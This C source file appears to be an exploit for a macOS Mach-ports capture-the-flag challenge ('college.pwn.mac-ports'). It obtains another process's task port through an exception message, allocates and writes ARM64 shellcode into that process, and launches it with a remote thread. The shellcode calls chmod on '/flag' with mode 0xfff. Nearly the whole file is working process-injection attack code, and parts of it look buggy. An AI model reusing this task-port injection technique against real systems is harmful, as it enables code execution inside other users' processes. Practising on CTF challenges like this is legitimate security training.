#include <mach/vm_map.h> 
#include <mach/mach.h>
#include <mach/mach_port.h>
#include <servers/bootstrap.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <stdlib.h>
#include <mach/arm/thread_status.h>
#include <mach/exception.h>
#include <mach/exc.h>
//#include <mach/mach_info.h>

// 必须与发送端完全一致的结构体（4字节对齐）
typedef struct __attribute__((aligned(4))) {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t data_desc;
    char data[0x1000];
} OOLMessage;

typedef struct {
    mach_msg_header_t header;
    char data[0x1000];          // 内联消息数据
} CustomMessage;

// 消息结构（包含端口权限）
typedef struct {
    mach_msg_header_t header;
    //mach_msg_body_t body;
    //mach_msg_port_descriptor_t port_desc; // 端口权限描述符
} PortTransferMessage;

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t thread; // 异常线程的端口
    mach_msg_port_descriptor_t task;   // 目标进程的 task 端口
    NDR_record_t ndr;
    exception_type_t exception;        // 异常类型（如 EXC_BAD_ACCESS）
    mach_msg_type_number_t codeCnt;    // 异常数据长度（通常为 2）
    mach_exception_data_type_t code[2];// 异常数据（如访问的地址）
} mach_exception_msg_t;

typedef struct mach_port_basic_info {
    mach_port_msgcount_t  mpl_qlimit;     
    mach_port_rights_t    mpl_rights;
    boolean_t             mpl_present;
    mach_port_seqno_t     mpl_seqno;
    mach_port_msgcount_t  mpl_mscount;
    mach_port_rights_t    mpl_sorights;
    boolean_t             mpl_srights;
    boolean_t             mpl_pdrequest;
    boolean_t             mpl_pset;
} mach_port_basic_info_t;

// 创建并注册服务端口
mach_port_t setup_receive_port() {
    mach_port_t port;
    kern_return_t kr;

    // 1. 创建新端口
    printf("mach_task_self:%x\n", mach_task_self());
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("Port allocate failed: %s\n", mach_error_string(kr));
        return MACH_PORT_NULL;
    }

    // 2. 添加发送权限（允许其他进程发送消息）
    kr = mach_port_insert_right(
        mach_task_self(),
        port,
        port,
        MACH_MSG_TYPE_MAKE_SEND
    );
    if (kr != KERN_SUCCESS) {
        printf("Insert right failed: %s\n", mach_error_string(kr));
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }

    // 3. 注册到 bootstrap 服务（假设服务名为 "com.xxx"）
    kr = bootstrap_register(
        bootstrap_port,
        "college.pwn.mac-ports.challenge.4b",
        port
    );
    if (kr != KERN_SUCCESS) {
        printf("Register failed: %s\n", mach_error_string(kr));
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }

    return port;
}

mach_port_t get_remote_port(const char* id)
{

    // 1. 查找名为xxx的端口
    // mach_port_name_t name;
    mach_port_t remote_port = MACH_PORT_NULL;
    kern_return_t kr;
    
    kr = bootstrap_look_up(bootstrap_port, id, &remote_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to lookup port: %s\n", mach_error_string(kr));
        return -1;
    }
    return remote_port;
}

// 发送端口权限给客户端
void send_port_right(mach_port_t target_port, mach_port_t port_to_send) {
    PortTransferMessage msg = {0};
    kern_return_t kr;

    // 构造消息头
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
    msg.header.msgh_size = sizeof(msg);
    msg.header.msgh_remote_port = target_port; // 目标端口
    msg.header.msgh_local_port = port_to_send;
    msg.header.msgh_id = 0x100; // 自定义消息ID

    /* // 消息体描述符 */
    /* msg.body.msgh_descriptor_count = 1; */
    /* msg.port_desc.name = port_to_send;          // 要发送的端口 */
    /* msg.port_desc.disposition = MACH_MSG_TYPE_COPY_SEND; // 传递发送权限 */
    /* msg.port_desc.type = MACH_MSG_PORT_DESCRIPTOR; */

    // 发送消息
    kr = mach_msg_send(&msg.header);
    if (kr != KERN_SUCCESS) {
        printf("mach_msg_send failed: %s\n", mach_error_string(kr));
    }
}

void  __attribute__((naked)) fshellcode() {
    asm(
        // "adrp    x8, .L.str\t\n"
        // "add     x8, x8, :lo12:.L.str\t\n"
        // "str     x8, [sp]\t\n"
        // "ldr     w0, [sp, #12]\t\n"
        // "add     sp, sp, #16\t\n"
        // "ret\t\n"
        // ".L.str: \t\n"
        // ".asciz \"/flag\" \t\n" 
        // ".byte 0"
        
        "movz x0, #0x67, lsl #32 \t\n"
        "movk x0, #0x616c, lsl #16 \t\n"
        "add x0, x0, #0x1000 \t\n"
        "add x0, x0, #0x1000 \t\n"
        "add x0, x0, #0x1000 \t\n"
        "add x0, x0, #0x1000 \t\n"
        "add x0, x0, #0x1000 \t\n"
        "add x0, x0, #0x1000 \t\n"
        "add x0, x0, #0x62f \t\n"
        "str x0, [sp] \t\n"
        "mov x0, sp \t\n"
        "mov x1, 0xfff \t\n"
        "mov x16, 0xf \t\n"
        "SVC #0 \t\n"
        "lable: \t\n"
        "b lable\t\n"
        
    );

}

// 将修改后的状态写回内核
kern_return_t reply_to_kernel(mach_port_t port, mach_exception_msg_t *msg) {
    mach_msg_header_t reply = {
        .msgh_bits = MACH_MSGH_BITS_REMOTE(msg->header.msgh_bits),
        .msgh_size = sizeof(reply),
        .msgh_remote_port = msg->header.msgh_remote_port,
        .msgh_id = msg->header.msgh_id + 100  // 必须 +100 的回复标识
    };
    return mach_msg(&reply, MACH_SEND_MSG, sizeof(reply), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    // 该描述符用于传递修改后的线程状态
    mach_msg_ool_descriptor_t state_desc;
    kern_return_t return_code; // 通常设置为 KERN_SUCCESS 表示异常已处理
} exception_reply_with_state_t;

// 主接收循环
void receive_loop(mach_port_t remote_port, mach_port_t port) {
    OOLMessage msg;
    kern_return_t kr;

    while (1) {
        // 初始化消息结构
        memset(&msg, 0, sizeof(msg));

        // 接收消息（阻塞模式）
        kr = mach_msg(
            (mach_msg_header_t*)&msg,
            MACH_RCV_MSG | MACH_RCV_LARGE, // 允许接收大消息
            0,
            sizeof(msg),
            port,
            MACH_MSG_TIMEOUT_NONE,
            MACH_PORT_NULL
        );

        if (kr != KERN_SUCCESS) {
            printf("Receive error: %s\n", mach_error_string(kr));
            break; //如果接收失败会一直接收，一直失败
        }

        // 验证消息格式
        if (!(msg.header.msgh_bits & MACH_MSGH_BITS_COMPLEX)) {
            printf("Error: Not a complex message!\n");
            continue;
        }

        if (msg.body.msgh_descriptor_count != 1) {
            printf("Error: Descriptor count mismatch!\n");
            continue;
        }

        // 提取 OOL 数据
        void *data = msg.data_desc.address;
        mach_vm_size_t size = msg.data_desc.size;

        printf("Received OOL data: address=%p, size=%llu\n", data, size);


        mach_port_t exception_port = (mach_port_t)data;

        mach_port_mod_refs(mach_task_self(), exception_port, MACH_PORT_RIGHT_SEND, 1);

        mach_exception_msg_t msg;
        kr = mach_msg(&msg.header, MACH_RCV_MSG, 0, sizeof(msg), exception_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(kr != KERN_SUCCESS){
            printf("Recv exception Error: %s\n", mach_error_string(kr));
        }
        // 解析异常信息
        exception_type_t exception = msg.header.msgh_id;
        mach_exception_data_t code = msg.code;     // code[0] 类型, code[1] 地址
        mach_port_t target_task = msg.task.name;

        //vm_map_read_t target_task = *(vm_map_read_t*)data;
        printf("target_task: 0x%x\n", target_task);


        mach_vm_address_t remoteCode = 0, remoteStack = 0;
        #define CODE_SIZE 4096
        #define STACK_SIZE 4096
        kr = mach_vm_allocate(target_task, &remoteCode, CODE_SIZE, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            printf("mach_vm_allocate code failed: %s\n", mach_error_string(kr));
        }
        kr = mach_vm_allocate(target_task, &remoteStack, STACK_SIZE, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            printf("mach_vm_allocate stack failed: %s\n", mach_error_string(kr));
        }

        vm_offset_t shellcode = fshellcode;
        kr = mach_vm_write(target_task, remoteCode, shellcode, receive_loop - fshellcode);
        if (kr != KERN_SUCCESS) {
            printf("mach_vm_allocate stack failed: %s\n", mach_error_string(kr));
        }

        kr = vm_protect(target_task, remoteCode, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect code segment failed: %s\n", mach_error_string(kr));
        }
        
        kr = vm_protect(target_task, remoteStack, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect stack segment failed: %s\n", mach_error_string(kr));
        }

        arm_thread_state64_t state = {0};
        state.__pc = (uint64_t)remoteCode;  // 入口地址
        state.__sp = (uint64_t)remoteStack + 2048; // 栈顶地址
        printf("%p\n", remoteCode);
        getchar();
        thread_act_t remoteThread;
        kr = thread_create_running(target_task, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT, &remoteThread);
        if (kr != KERN_SUCCESS) {
            printf("thread create failed: %s\n", mach_error_string(kr));
        }
        
        // 调整线程状态
        /* arm_thread_state64_t state, old_state, new_state; */
        /* mach_msg_type_number_t stateCnt = ARM_THREAD_STATE64_COUNT; */
        /* kr = thread_get_state(msg.thread.name, ARM_THREAD_STATE64, (thread_state_t)&state, &stateCnt); */
        /* if (kr != KERN_SUCCESS) { */
        /*     printf("thread get state failed: %s\n", mach_error_string(kr)); */
        /* } */
        /* printf("state pc: %p\n", state.__pc); */

        /* state.__pc += 4; */

        /* kr = thread_set_state(msg.thread.name, ARM_THREAD_STATE64, (thread_state_t)&state, &stateCnt); */
        /* if (kr != KERN_SUCCESS) { */
        /*     printf("thread get state failed: %s\n", mach_error_string(kr)); */
        /* }   */     
        // 回复内核继续执行
        exception_reply_with_state_t reply;
        // 设置回复消息头：回复端口使用接收到消息的远程端口
        reply.header.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0);
        reply.header.msgh_size = sizeof(reply);
        reply.header.msgh_remote_port = msg.header.msgh_remote_port;
        reply.header.msgh_local_port = MACH_PORT_NULL;
        // msgh_id 通常要求与接收到的消息对应，此处简单处理
        reply.header.msgh_id = msg.header.msgh_id;  // 此数值需与异常处理协定一致

            // 设置消息体中描述符的数量（这里有一个 out-of-line 描述符）
        reply.body.msgh_descriptor_count = 1;
        // 配置描述符，指向新的线程状态（new_state 在栈上，所以 deallocate 设为 FALSE）
        reply.state_desc.address = &state;
        reply.state_desc.size = sizeof(state);
        reply.state_desc.deallocate = FALSE;
        // 采用虚拟复制方式传输数据（MACH_MSG_VIRTUAL_COPY 可以避免真正的数据拷贝）
        reply.state_desc.copy = MACH_MSG_VIRTUAL_COPY;
        reply.state_desc.pad1 = 0;
        // 返回值设为 KERN_SUCCESS 表示异常已处理
        reply.return_code = KERN_SUCCESS;


        
        kr = mach_msg(&reply.header,
                      MACH_SEND_MSG,
                      reply.header.msgh_size,
                      0,
                      MACH_PORT_NULL,
                      MACH_MSG_TIMEOUT_NONE,
                      MACH_PORT_NULL);
        if (kr != MACH_MSG_SUCCESS) {
            printf( "发送异常回复失败：%s\n", mach_error_string(kr));
        } else {
            printf("已发送异常回复，通知内核恢复异常线程执行。\n");
        }

        
        printf("Recv exception: %d\n", exception);

        
        while(1);
        
        //printf("%s", offset);
        // 必须释放 OOL 内存！
        kr = vm_deallocate(mach_task_self(),
                          (mach_vm_address_t)data,
                           size
                           );
        break;
    }
}


int main() {

    mach_port_t remote_port = get_remote_port("college.pwn.mac-ports");
    
    mach_port_t port = setup_receive_port();
    if (port == MACH_PORT_NULL) {
        return 1;
    }
    send_port_right(remote_port, port);
    
    printf("Service running on port: %#x\n", port);
    receive_loop(remote_port, port);

    // 清理
    printf("destroy mach_port\n");
    mach_port_destroy(mach_task_self(), port);
    return 0;
}
